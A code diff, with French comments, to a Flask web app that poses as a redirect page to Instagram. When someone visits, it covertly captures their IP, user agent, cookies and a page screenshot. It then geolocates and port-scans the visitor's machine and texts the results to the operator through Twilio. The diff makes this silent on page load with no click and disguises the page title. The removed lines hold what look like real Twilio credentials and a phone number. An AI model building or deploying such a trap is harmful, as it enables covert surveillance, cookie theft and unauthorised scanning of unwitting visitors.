@@ -6,14 +6,13 @@ import socket
 app = Flask(__name__)
 
 # Twilio credentials
-account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
-auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'
-from_number = '+12524866318'  # Numéro Twilio
-to_number = '+33635960569'    # Ton numéro vérifié
+account_sid = 'TON_ACCOUNT_SID'
+auth_token = 'TON_AUTH_TOKEN'
+from_number = '+12524866318'
+to_number = '+336XXXXXXXX'
 
 client = Client(account_sid, auth_token)
 
-# Géolocalisation IP
 def get_geolocation(ip):
     try:
         res = requests.get(f"http://ip-api.com/json/{ip}").json()
@@ -21,10 +20,9 @@ def get_geolocation(ip):
     except:
         return "Localisation impossible"
 
-# Scan rapide des ports communs (optionnel)
 def scan_ports(ip):
     try:
-        common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3389]
+        common_ports = [21, 22, 23, 80, 443, 445]
         open_ports = []
         for port in common_ports:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -37,7 +35,6 @@ def scan_ports(ip):
     except:
         return []
 
-# Envoi du SMS
 def send_sms(ip, user_agent, cookies, screenshot):
     location = get_geolocation(ip)
     ports = scan_ports(ip)
@@ -47,12 +44,12 @@ def send_sms(ip, user_agent, cookies, screenshot):
         f"IP : {ip}\n"
         f"User-Agent : {user_agent}\n"
         f"Cookies : {cookies[:50]}...\n"
-        f"Screenshot (début) : {screenshot[:50]}...\n"
+        f"Screenshot : {screenshot[:50]}...\n"
         f"Localisation : {location}\n"
         f"Ports ouverts : {ports if ports else 'Aucun'}"
     )
 
-    print("[+] Envoi SMS avec message :")
+    print("[DEBUG] Envoi SMS...")
     print(message_body)
 
     try:
@@ -61,15 +58,15 @@ def send_sms(ip, user_agent, cookies, screenshot):
             from_=from_number,
             to=to_number
         )
-        print(f"[+] SMS envoyé ! SID : {message.sid}")
+        print(f"[DEBUG] SMS envoyé ! SID : {message.sid}")
     except Exception as e:
-        print(f"[!] Erreur Twilio : {e}")
+        print(f"[ERREUR TWILIO] {e}")
 
 @app.route('/')
 def index():
     return '''
     <html>
-    <head><title>Tracking</title></head>
+    <head><title>Redirection</title></head>
     <body>
         <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
         <script>
@@ -81,18 +78,19 @@ def index():
                 html2canvas(document.body).then(canvas => {
                     const screenshot = canvas.toDataURL();
 
-                    document.body.addEventListener('click', function(event) {
-                        fetch("/log", {
-                            method: "POST",
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                ip: data.ip,
-                                ua: navigator.userAgent,
-                                cookies: cookies,
-                                screenshot: screenshot
-                            })
-                        });
-                        window.location.href = "https://instagram.com"; // Redirection
+                    // Envoie immédiat (pas besoin de clic)
+                    fetch("/log", {
+                        method: "POST",
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            ip: data.ip,
+                            ua: navigator.userAgent,
+                            cookies: cookies,
+                            screenshot: screenshot
+                        })
+                    }).then(() => {
+                        // Redirection après envoi
+                        window.location.href = "https://instagram.com";
                     });
                 });
             });
@@ -109,6 +107,7 @@ def log():
     cookies = data.get('cookies')
     screenshot = data.get('screenshot')
 
+    print(f"[DEBUG] Données reçues : IP={ip}, UA={user_agent}")
     send_sms(ip, user_agent, cookies, screenshot)
 
     return jsonify({"status": "ok"})
